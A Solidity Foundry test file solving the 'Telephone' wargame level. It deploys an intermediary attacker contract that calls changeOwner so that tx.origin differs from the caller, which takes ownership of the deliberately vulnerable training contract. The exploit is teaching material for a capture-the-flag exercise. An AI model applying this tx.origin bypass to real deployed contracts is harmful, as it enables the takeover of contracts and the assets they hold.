/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { Telephone } from "@src/04-Telephone/Telephone.sol";

contract AttackerContract {
    address private immutable owner;
    Telephone private telephone;

    constructor(address _telephone) {
        owner = msg.sender;
        telephone = Telephone(_telephone);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function attack() external onlyOwner {
        telephone.changeOwner(msg.sender);
    }
}

contract HackTelephone is Test {
    Telephone public telephone;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        telephone = new Telephone();
    }

    function testClaimOwnershipOfTelephone() public {
        // hack the contract
        // your code goes here

        // let's deploy the attacker contract which will enable use to change the ownership of the `Telephone` contract
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract(address(telephone));

        // the `Telephone::changeOwner` function checks if the caller is not tx.origin. We can easily bypass that check
        // by invoking `Telephone::changeOwner` using the attackerContract as an intermediary, and passing in the
        // address of the attacker
        attackerContract.attack();
        vm.stopPrank();

        assertEq(telephone.owner(), attacker);
    }
}
